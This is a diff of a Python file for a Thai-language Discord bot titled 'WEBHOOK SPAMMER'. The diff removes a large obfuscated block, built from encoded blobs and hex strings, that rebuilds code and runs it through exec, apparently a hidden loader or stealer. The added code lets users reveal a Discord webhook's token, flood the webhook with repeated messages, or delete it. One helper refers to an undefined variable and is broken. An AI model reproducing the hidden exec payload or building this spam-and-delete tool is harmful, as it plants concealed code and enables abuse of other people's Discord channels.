@@ -1,7 +1,137 @@
-#pip install pycryptodome  , It works only v3.11 Above.
-import random ,base64,codecs,zlib;pyobfuscate=""
+from re import match
+import nextcord
+from nextcord.ext import commands
+import requests
+import json
+import aiohttp
+import os
+from keepAlive import keep_alive
 
-obfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(RSA)'],['''9Q3Q5kh!A1-G_~(W-ASDrXU^@QYOArX~t9Hr>tcer~UmQwVKCQK(W)L`?(REycXqwYIQ7&W@%gZ&emx%EuSX{Y_dpXYp~em*M+@OgH|)+^6<*|;8lD$iCl-0Z}qxn2O=H{f?p5D=d#t9u$)9Np+G%Pa-5w(m7JvuKcKU1`P30)ZSD0E4=99>YOg~xU!g8*x0U)A5}8#m)lr_pHXVddBj@DJW1)os<BzgZeX7tgl3qk5%HIkKFZ0}XTmIJV@IOR|(@6YM@RN>Cn%H*-SosE2<qEte&R6i;kPpX6v{Zv>X-8^MLZ6u?{V+LZDhOmN(5%1Un+5Q1`Nw`(4;^+uTx2y}3>hKZ&mU7qBb%4qy0JHXdRkwJ)OYWZvu)!_o`pXyz@^XPVm;S1ZAMiEuh4Ur6fL`j+drS;lL#F$xyV%rN~U_P8$>&4W|>@xWOCgmmn=+TtE%|9fv_*Ta!?F+n&RaidJ?lV3l<zc^{=@k9)?KC#g@d+6C%mt&Qk5B(s+1JmeJ`=Jw2szB;^j8{!Ftvy`^c+kC5^q=4HH}o`E^q$Dre`$25+hdRsd(Tr&yM1|SAK|M?7QN7Lx#@jkMXws9-*n8}6yHOQ`@y=^hfEF8HxqAO;mhYPyKGTd)s+>*?j%s<0Il}mkH5U<r*a1akK2zL?P4Ij2?hsMkZ*_`j~{?AwU2Y$ztqkIDWB4I*9cRXJA%APkA=B|NJLpILhv6!aQ8}UZ1Mep!BG#Q$D*A>??63`FYH}g^&H;TVqk+mu?yrBdT<(-Gcy4TY;#~mv^@!8iWEMQn|nKJq0KPrn-xWhu;RKLS@1f*n3HG<9Eb>fy+$84G5`XP%c8-MZwM&w;Psu``9z3TEupKGiTz-;BGc6cp;L6l?8BX%>*Zm$;U?yXgDS#aED<eG$EAtrcJiP|>xo(8X&Su3dGEpojpNnO&F;XRmoOvJ%+zXokx8c{$4_)THrEz{McvzIo?zRhe>Xzb)6vHkGup+DxjWmG=<$zmi52rZ@AYGNc2_7~rUMZ^X^VHze+xo9&JFqR~&#CLs(^@qL;rw$bQ@O;27J|&XzM+luEuq)gKz6=k8+QjCzF(i1sy`FfSc1W|bAXu~FMAWg~G!*kbjYrPOp_p9RQ~u-8Z33s;3TQTRyI{ZXabs<M&g94SN5fLsdst(Eh5Ot>c(@)JvWq8m$f1A=N6`XA&t3O8Cx>F%heX>PL`nBNWYo8)Z~Y!^MwSqed1b0uzhOLu19wMA=j<Gxf9X8e(631o-nQ=Z_jj2c`{rnQq$2(L`ykvlEV9e$R^~=?<6N~_3Ju51Q;P~d$RbMRWqPs$*I(+py-2Mz%FmAj{CHy(yf(B7w*T`!SU}5h@)g`~s7mPtO=)G^Ckfz9U5u8nc)(v-paPsxWcv-?!Dq`c`9Y61)TjOKvi!6|z77x9tbrIXWo0-)NzLTLpU7T*itN1^mzuT4m+;p$i>E-LVZNpehP`^c%Ewt>sp%#|vPN#+kx}K8wWKz>8G3VTtG&r>MzQi>XU>5sU^V4a(f2q}dPNLiqVdr(`Bwa#UIe!`B$ODW|M4;E!2ncig%gB0f`jK`pQ@24+Bk^28yZMReNJU?np{jcR%fZ{rm0Sv-xOhu&7HJ4IGl8+nKcmGa`TM4Kugv=Mn7Itr2-{4=UJ?ljJ(A3P&TkBhK{)9{pLMl2!<HqCC8Kfa3hf5`2A6&P0+K1EwRQe=`=DB^UHbjG(-ayx$2J27GTS5u(Eua@%DchFL>iquCbMnEr0#h9dLNxk46gSomNmCwbAQPU*HUS@6a8?`>1XLWr<P>VZziVXUoKqN@Q-5D@)_PbWvAgI;-6YZhZSjnLonl&fr0qI3m;<1$*3ILvvE!!KMJ#4a#lVFk!a+aMK?@q80@<n^j}~`2ck6OyNtEQKJLsP~uGRURQ6hAloHmkn$?(MVY$SdY6<mp@}cJ5RpPvl%ee6Z8}zf4?WouGn+8g8%!6zfc#k;-@Q*0Z`=4w-iR7dD`&Kwz<{hzyqy55T*bg}*fF&}2TEJ0rn7Nwbk8=-Z7qCde>2+~0YVAf9AFZ3T?C1%ZmRw$YdCt(f4WK4m7{CBK>b3MYfERuDa}v)+Wdh)Z@`nC)ibOFx#kI{(3<}qz@F;10yPOq*}=y~1=9rhT}pBt+Rfi(=o-=UDK)_*z~UjX{^kkLkS1(`f;g9CE)?v%fQQo5p-lWh1;DaA(F+pztU;3A&00bTj9r78ZZ~t<6m_;nr{J``dz+TcF0nPi9k5mV@#gJb+PfI@8yuGn?#MqAwMU6s9dR9%u1&vU@BezkAw$)MFJupw$okzyuCq`r{jMxkzz&Mi;0@<z{u-JZdxFsn4@v>xId-N%U|c3w%(?)QTF{1%We<hKby{qzl~ra6#ct#Rur-K%XtdnqL0jAA4mZ#@+PHmpZRsbDIU1AS9_lAuI_%@r?f;Rp)w{oOUOZ`91=ptQkQZ~FkH}cJk50cVm+N2a5PQ1Y%($C}rb`3;@SQG98yx_??cBT~Snn?$x?L7idrHVe`OxF_u4&OF?AmB>`CdCap)wc!(8`DR6xyB<J)1(`a@=j(gZ?hzJ)MaXEUHtT%QR%w2!^wkHkQ%(^7{U%<Ro=x#=~hv95wU-3V3w7#p^nhkDdFx5=rJer`HW&XkO#)N^MI<n0*~M{m3P#;`3hv_St($(RK-d7mOlOsh9gH1#s3UK4Uh<k;$+qLX0rlkm9aRF)c7g5!|wlAGAHTN5T-D=^L7Z1N;MWc2RJo{67(#OTD~Wo2FsDMp4*RQxD@Q&Hk5p?|x9Rr}~kEaNZkYbNCOTrz~+?Y35Aot#4?uN(DdQm&^*aA63ryWNO85Mfh8{cf!4?(BVhh0;d9jqYD;yyw&05RrHl>-6JB*Vg*mvx!h`%W|JzF5AcQi{5OdPg+v*9X`-nD&Xe9|`T-cG()Cn<l%l}-B()z|Zyf{9DlLbLh&3V_gs}bJWlZDvAPvbGE6`J_>%y|O^8!_oho2{JEuu#crl#!GB51FSrKt(N`ecNAcZ0;F!hqT$w&(0bHvgl5SZW*{x5M@?2Huvq=VLeobb8&6_;85P8E@v&B9J$Io7Wya7?%hazHqHE`7B|+=zi1@_I?yuN>CB_^EgPeVTi>+XaML&nysrKHMB?51UQ-$&h}8U4_glC!|PrD>cQ+4RDlN}TS;-e2;&1o|Md;vAV`FZo-LslHc>Nf#{%&y$AN503%ydh?rUk^73xh5)kuBZ_dTn%UkY!f{S5pc_JQfIb<6$82TZ_TLLoolrqE_9-iO!9BH{llhG;Pv{w6)M)X*I?b^5@1-q!U8`NLB3Hsf5KG~m&|3wXs9uu`F>Ns#Vrfd@eBced$OwY2a~wiO!HL$DW)j(<$db}Xtyz6p7Y$-?WpwTR&wMB6T}Og8fWC$YhSd&5%<k*O?uGpW3Us^my@8{R0q`MC_E(7(xI>LSG9+r%%tZkl=4t@g0=m5g8r2K~R>jO~fiG2IfWcFqY8e7lOj-8xDsQmb!#v~Xm$+e}6_?5>SuybLv6?#xL9Z(1l!=i#XBJA=K4)Kv#t;BZgWSE0&+AV})7^L~yeSn)qiK!Q{OJ%E#0d*5TgU?8*cq6L?KCD1><xImp%jbVD$IR)#m^xK~U$F3?AtT__zL$u>&<J;d`48zj>i+0&kQ$*-Q)=HTtRq*qq;Q8P+c*TfT4zhW8Nkx3mF76Vgq_}F4zH+WZGnHqkz?v{wEz`&^Pj@MVb*<=;({as(Y->yCWx3udQ|`zh2s5gYmJ?fpDeuMgDC;4BB2<LsK1`gBEy#CzaGX^WNAK>I;txiX;wz^_j6$Ok$p$eG739|<P6e|rpwpwPQ19M2<=qp@Jf?!dW0bk)vjGHUd|!Z0<=QpeLQ)m{+&$c*MI>{ZBCqLuj3wp-d#?*)A%+m%n=?i=bC<rJNOjdi%zmueH0sfD'''.replace('\n','')]))
+token = os.environ['token']
+vc_id = 1181590432120049684
 
-_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval("".join(chr(i) for i in [101,120,101,99]))("\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x5f\x22\x2c\x70\x72\x69\x6e\x74\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x5f\x22\x2c\x65\x78\x65\x63\x29\x3b\x73\x65\x74\x61\x74\x74\x72\x28\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x2c\x22\x5f\x5f\x5f\x5f\x22\x2c\x65\x76\x61\x6c\x29");__='600840 10052792 2475510 107811 3460338 725070 743968 2892000 2595808 1123520 4498098 4658724 9505818 3510345 255392 146490 5557929 9774387 9643374 676195 8169140 8968656 7951905 2729216 6994785 2809039 2272480 238206 8998248 10083880 1132512 1887269 9978295 4040976 199290 720029 6381240 390456 4855272 5536608 8270336 5334956 137240 1950112 813888 1000864 14176 4719645 7434130 4414928 6253299 9947928 1058600 1230358 2126544 2411955 8232000 3136064 3545955 10065990 11478610 1845676 5793228 1659528 8606412 2662784 9252354 3826789 8515228 10136529 9876386 4503170 4636636 3050030 2304864 8648920 3476588 1063810 6624464 4304298 1150491 8042410 11245620 2352544 7278969 5070780 3834960 143016 6244008 3168128 11537244 1865133 1213344 1977057 519120 3126900 1538392 2683994 3910416 125890 1943840 169376 2568608 2306112 1493210 846355 4957785 3989836 8217104 10113987 6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
+intents = nextcord.Intents.default()
+intents.message_content = True
 
+bot = commands.Bot(command_prefix='!',intents=intents,help_command=None)
+
+async def logsend(embed):
+  async with aiohttp.ClientSession() as session:
+    webhook = nextcord.Webhook.from_url(roblox['webhook'], session=session)
+    await webhook.send(embed=embed)
+
+class Spam(nextcord.ui.Modal):
+    def __init__(self):
+        super().__init__("สเเปมเว็ปฮุก")  
+        self.webhook = nextcord.ui.TextInput(
+            label="ลิ้งค์",
+            required=True
+        )
+        self.add_item(self.webhook)
+        self.msg = nextcord.ui.TextInput(
+            label="ข้อความ",
+            required=True
+        )
+        self.add_item(self.msg)
+        self.amount = nextcord.ui.TextInput(
+            label="จำนวน",
+            required=True
+        )
+        self.add_item(self.amount)
+
+    async def callback(self, interaction: nextcord.Interaction):
+        response = requests.get(self.webhook.value)
+        if not match(r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}", self.webhook.value):
+            return await interaction.send("ลิงค์เว็ปฮุคไม่ถูกต้อง", ephemeral=True)
+
+        try:
+            amount_value = int(self.amount.value)
+        except ValueError:
+            return await interaction.send("จำนวนต้องเป็นตัวเลข", ephemeral=True)
+
+        if response.status_code == 200:
+            await interaction.send(f"**กำลังสเเปมไปที่** `{self.webhook.value}`", ephemeral=True)
+            for i in range(amount_value):
+                requests.post(self.webhook.value, json={'content': self.msg.value})  
+        else:
+            await interaction.send("**สแปมเว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**", ephemeral=True)
+
+
+class Delete(nextcord.ui.Modal):
+    def __init__(self):
+        super().__init__("ลบเว็ปฮุค")  
+        self.webhook = nextcord.ui.TextInput(
+            label="ลิ้งค์เว็บฮุก",
+            required=True
+        )
+        self.add_item(self.webhook)
+    async def callback(self, interaction: nextcord.Interaction):
+        if not match(r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}" ,self.webhook.value):
+          return await interaction.send("ลิงค์เว็ปฮุคไม่ถูกต้อง",ephemeral=True)
+        if requests.delete(self.webhook.value).status_code == 204:
+          await interaction.send(f"**ลบเว็ปฮุคสําเร็จ** `{self.webhook.value}`",ephemeral=True)
+        else:
+          await interaction.send("**ลบเว็ปฮุคไม่สําเร็จ หรือ เว็ปฮุคถูกลบไปแล้ว**",ephemeral=True)
+
+class Check(nextcord.ui.Modal):
+    def __init__(self):
+        super().__init__("เช็คเว็ปฮุก")  
+        self.webhook = nextcord.ui.TextInput(
+            label="ลิ้งค์เว็บฮุก",
+            required=True
+        )
+        self.add_item(self.webhook)
+    async def callback(self, interaction: nextcord.Interaction):
+        response = requests.get(self.webhook.value)
+        if not match(r"https:\/\/discord\.com\/api\/webhooks\/[0-9]{18,19}\/[a-zA-Z0-9_-]{68,69}" ,self.webhook.value):
+          return await interaction.send("ลิ้งค์เว็ปฮุกไม่ถูกต้อง",ephemeral=True)
+        if response.status_code == 200:
+          i = response.json()
+          if i['avatar'] == None:
+            embed = nextcord.Embed(description=f"**TYPE** : `{i['type']}`\n**ไอดี** : `{i['id']}`\n**ชื่อ** : `{i['name']}`\n**ไอดีช่อง** : `{i['channel_id']}`\n**ไอดีเซิฟ** : `{i['guild_id']}`\n**ไอดีแอป** : `{i['application_id']}`\n**โทเคนเว็ปฮุก** : `{i['token']}`")
+            await interaction.send(embed=embed,ephemeral=True)
+          else:
+            embed = nextcord.Embed(description=f"**TYPE** : `{i['type']}`\n**ไอดี** : `{i['id']}`\n**ชื่อ** : `{i['name']}`\n**ไอดีช่อง** : `{i['channel_id']}`\n**ไอดีเซิฟ** : `{i['guild_id']}`\n**ไอดีแอป** : `{i['application_id']}`\n**โทเคนเว็ปฮุก** : `{i['token']}`")
+            embed.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{i['id']}/{i['avatar']}.png")
+            await interaction.send(embed=embed,ephemeral=True)
+        else:
+          await interaction.send("**ไม่สำเร็จ อาจจะถูกลบไปเเล้วนะ+**",ephemeral=True)
+
+class Button(nextcord.ui.View):
+    def __init__(self):
+        super().__init__(timeout=None)
+
+    @nextcord.ui.button(label="เช็คเว็ปฮุก", style=nextcord.ButtonStyle.green, emoji="🔍",custom_id="เช็ค webhook")
+    async def check(self, button: nextcord.Button , interaction: nextcord.Interaction):
+                await interaction.response.send_modal(Check())
+
+    @nextcord.ui.button(label="สแปมเว็บฮุก", style=nextcord.ButtonStyle.blurple, emoji="🔫",custom_id="ยิง webhook")
+    async def spam(self, button: nextcord.Button , interaction: nextcord.Interaction):
+                await interaction.response.send_modal(Spam())
+
+    @nextcord.ui.button(label="ลบเว็บฮุก", style=nextcord.ButtonStyle.red, emoji="👾",custom_id="ลบ webhook")
+    async def delete(self, button: nextcord.Button , interaction: nextcord.Interaction):
+                await interaction.response.send_modal(Delete())
+
+
+@bot.event
+async def on_ready():
+    bot.add_view(Button())
+    print(f"BOT NAME : {bot.user}")
+    await bot.change_presence(activity=nextcord.Game(name="《 Fake Link Webhook 》"))
+    voicechannel = bot.get_channel(vc_id)
+    if voicechannel:
+        await voicechannel.connect()
+
+@bot.command(pass_context=True)
+async def setup(ctx):
+    if ctx.author.guild_permissions.administrator:
+        await ctx.message.delete()
+        embed = nextcord.Embed(title="WEBHOOK SPAMMER",description="```สแปม webhook ```",color=0xFFFFFF)
+        embed.set_image(url="https://media.discordapp.net/attachments/1183420745544646716/1190862499193565236/w.gif?ex=65a35820&is=6590e320&hm=20f851fcbebfbf66b0972f0241874dbcf7cdbcea5d7797701616e91c0d722af2&=")
+        await ctx.send(embed=embed, view=Button())
+    else:
+        await ctx.reply('ไม่น่ารักเลยนะค่ะ!')
+
+keep_alive()
+bot.run(token)
